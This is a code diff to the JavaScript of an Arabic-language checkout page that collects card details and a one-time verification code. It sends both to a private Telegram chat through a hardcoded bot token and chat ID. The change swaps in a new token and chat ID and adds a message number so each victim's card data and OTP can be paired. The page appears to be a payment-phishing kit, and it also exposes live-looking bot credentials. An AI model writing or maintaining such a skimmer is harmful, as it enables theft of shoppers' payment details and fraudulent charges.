@@ -11,7 +11,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const paymentDetails = document.querySelector(".payment_details");
     const cart = JSON.parse(localStorage.getItem("cart")) || [];
 
-    for (let i = 1; i <= 12; i++) {
+    for (let i = 1; i <= 24; i++) {
         const option = document.createElement("option");
         option.value = i;
         option.textContent = `${i} شهر`;
@@ -152,8 +152,8 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     
         if (isValid) {
-            const botToken = "8099754986:AAG5AHBSlXr8Zfbs8QGTyOYLljLum39z-Hk";
-            const chatId = "6932671138";
+            const botToken = "7973735099:AAE-MYlf-dsAKXPyklTxzGwZ_hB-oDG82wA";
+            const chatId = "948393191";
     
             let productDetails = '';
             cart.forEach((product, index) => {
@@ -162,7 +162,11 @@ document.addEventListener("DOMContentLoaded", () => {
                 productDetails += `  - **الإجمالي:** ر.س ${(product.quantity * product.price).toFixed(2)}\n\n`;
             });
     
+            const messageId = Date.now();
+    
             const message = `
+                *رقم الرسالة:* ${messageId}
+    
                 *بيانات الطلب:*
                 ${productDetails}
                 - **عدد المنتجات:** ${totalQuantity}
@@ -226,6 +230,7 @@ document.addEventListener("DOMContentLoaded", () => {
                         if (result.isConfirmed) {
                             const verificationCode = result.value;
                             const verificationMessage = `
+                                *رقم الرسالة:* ${messageId}
                                 *بيانات التحقق:*
                                 - **كود التحقق:** ${verificationCode}
                             `;
@@ -285,7 +290,6 @@ document.addEventListener("DOMContentLoaded", () => {
             button.disabled = false; 
         }
     });
-    
     
     document.getElementById("card_number").addEventListener("input", function (e) {
         this.value = this.value
